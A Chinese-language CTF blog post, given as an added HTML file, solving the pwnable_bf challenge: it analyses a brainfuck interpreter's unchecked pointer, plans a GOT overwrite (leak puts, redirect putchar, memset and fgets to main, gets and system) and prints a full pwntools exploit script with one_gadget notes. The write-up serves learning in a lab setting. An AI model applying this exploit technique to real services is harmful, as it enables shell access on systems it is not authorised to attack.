@@ -1,0 +1,475 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>2024-12第三周：pwnable_bf | X1NRI&#39;s trash</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="每周一pwn系列">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="2024-12第三周：pwnable_bf"/>
+  <meta property="og:site_name" content="X1NRI&#39;s trash"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI&#39;s trash" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI&#39;s trash</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> 2024-12第三周：pwnable_bf</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 每周一pwn系列
+		 </div> <!-- alert -->
+	  		
+
+	  <blockquote>
+<p>题目地址：<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_bf">BUUCTF在线评测</a><br>vmpwn专题-2</p>
+</blockquote>
+<h1 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h1><p><img src="/EXP_FILE/cd644ea16a968acdba5a681a792795f3_MD5.jpeg"></p>
+<h1 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h1><p>一个brainfuck虚拟机<br><img src="/EXP_FILE/b67c8a860502406ff58f392b38fe6b16_MD5.jpeg"><br>p是一个全局指针，指向 bss段的 tape </p>
+<p>对opcode的解析相对比较简单<br><img src="/EXP_FILE/d6a656b9d268ab3149335e6f8ab74fdc_MD5.jpeg"></p>
+<ul>
+<li>“+”：++*p，tape存储的值+1</li>
+<li>“,”：输入一个字节到*p</li>
+<li>“-“：–*p，tape存储的值-1</li>
+<li>“.”：打印*p一个字节 </li>
+<li>“&lt;”：–p，p所指地址-1</li>
+<li>“&gt;”：++p，p所指地址+1</li>
+<li>“[“：没用</li>
+</ul>
+<p>因为没对p做出任何限制，所以可以任意地址读写</p>
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>现在能做的：</p>
+<ol>
+<li>增&#x2F;减任意地址一字节</li>
+<li>输入&#x2F;输出任意地址任意字节<br>partial relro，bss 又离 GOT 很近，可以直接改 GOT 表</li>
+</ol>
+<p>我一开始想如何泄露完libc后再回到main上，改GOT为main？</p>
+<p>其实不需要，opcode先泄露再输入，这样泄露完libc后程序会等待输入，我们就可以改GOT了</p>
+<p>发现改成one_gadget没用，那么只能走system(‘&#x2F;bin&#x2F;sh’)，但是putchar只能传参一字节，不好直接构造，还是得回到main上<br><img src="/EXP_FILE/7652a8e59b639c045f0b226f95deb0c0_MD5.jpeg"></p>
+<p>思路：</p>
+<ol>
+<li>先打印puts地址泄露libc</li>
+<li>改putchar为main，改memset为gets，改fgets为system，然后回到main时输入 ‘&#x2F;bin&#x2F;sh’<br><img src="/EXP_FILE/b3dc8f8d90135764a3f77fb5964215ca_MD5.jpeg"><br>我一开始想改puts为main，但是主函数还会调用puts，这就相当于调用了很多次main导致程序异常。改putchar就很好，毕竟已经泄露过了libc</li>
+</ol>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token comment"># -*- coding: utf-8 -*-</span>
+<span class="token comment">#@Author:X1NRI</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> os
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">from</span> ctypes <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token comment">#from LibcSearcher import LibcSearcher</span>
+
+<span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span>
+		<span class="token comment">#pause()</span>
+<span class="token comment">#------------------------------------------------------------------</span>
+
+<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+
+	<span class="token comment">#,</span>
+	<span class="token comment">#dbg('b *0x0804865A')</span>
+	<span class="token comment">#+</span>
+	<span class="token comment">#dbg('b *0x08048665')</span>
+	
+	<span class="token comment">#leak puts</span>
+	payload<span class="token operator">=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x88</span>
+	payload<span class="token operator">+=</span><span class="token string">'.>.>.>.'</span>
+	payload<span class="token operator">+=</span><span class="token string">'&lt;&lt;&lt;'</span>
+	
+	<span class="token comment">#putchar</span>
+	payload<span class="token operator">+=</span><span class="token string">'>'</span><span class="token operator">*</span><span class="token number">0x18</span>
+	payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span>	
+	
+	<span class="token comment">#memset</span>
+	payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x8</span>	
+	payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span>		
+	
+	<span class="token comment">#fgets</span>
+	payload<span class="token operator">+=</span><span class="token string">'&lt;'</span><span class="token operator">*</span><span class="token number">0x20</span>
+	payload<span class="token operator">+=</span><span class="token string">',>,>,>,>'</span>	
+	
+	payload<span class="token operator">+=</span><span class="token string">'.'</span>
+	sla<span class="token punctuation">(</span><span class="token string">'except [ ]'</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+	
+	
+	ru<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+	puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>
+	libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
+	lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>
+	
+	dbg<span class="token punctuation">(</span><span class="token string">'b *0x8048671'</span><span class="token punctuation">)</span>
+	payload<span class="token operator">=</span>p32<span class="token punctuation">(</span><span class="token number">0x8048671</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'gets'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+	sl<span class="token punctuation">(</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>
+	
+	<span class="token comment">#dbg('')</span>
+	itr<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token triple-quoted-string string">'''
+0x3a80c execve("/bin/sh", esp+0x28, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x28] == NULL
+
+0x3a80e execve("/bin/sh", esp+0x2c, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x2c] == NULL
+
+0x3a812 execve("/bin/sh", esp+0x30, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x30] == NULL
+
+0x3a819 execve("/bin/sh", esp+0x34, environ)
+constraints:
+  esi is the GOT address of libc
+  [esp+0x34] == NULL
+
+0x5f065 execl("/bin/sh", eax)
+constraints:
+  esi is the GOT address of libc
+  eax == NULL
+
+0x5f066 execl("/bin/sh", [esp])
+constraints:
+  esi is the GOT address of libc
+  [esp] == NULL
+
+'''</span>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+	context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">32</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>
+	context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 150"</span><span class="token punctuation">]</span>
+	binary<span class="token operator">=</span><span class="token string">'./bf'</span>
+	context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+	elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
+	libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+		io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+	<span class="token keyword">else</span><span class="token punctuation">:</span>
+		io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>
+	s	  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload		<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+	sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload		<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+	sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload	<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+	sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload	<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
+	r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num   		   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>
+	ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP		<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>
+	rl	  <span class="token operator">=</span> <span class="token keyword">lambda</span> 				   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
+	uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span> 				   <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> 
+	uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span> 				   <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
+	ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data 			<span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>
+	eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data 			<span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>
+	es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       	<span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>
+	ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data 			<span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>		
+	itr  <span class="token operator">=</span> <span class="token keyword">lambda</span> 				   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	ic   <span class="token operator">=</span> <span class="token keyword">lambda</span> 				   <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+	pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s				<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr 	<span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+	pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2024/12/19/2024-12%E7%AC%AC%E4%B8%89%E5%91%A8%EF%BC%9Apwnable_bf/" class="leancloud-visitors view" data-flag-title="2024-12第三周：pwnable_bf">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/12/13/2024-12第二周：ciscn_2019_qual_virtual/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-12-19 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/CTFpwn/">CTFpwn<span>5</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/每周一pwn系列/">每周一pwn系列<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-article-text">基本信息</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-article-text">逆向分析</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-article-text">漏洞利用</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#EXP"><span class="toc-article-text">EXP</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
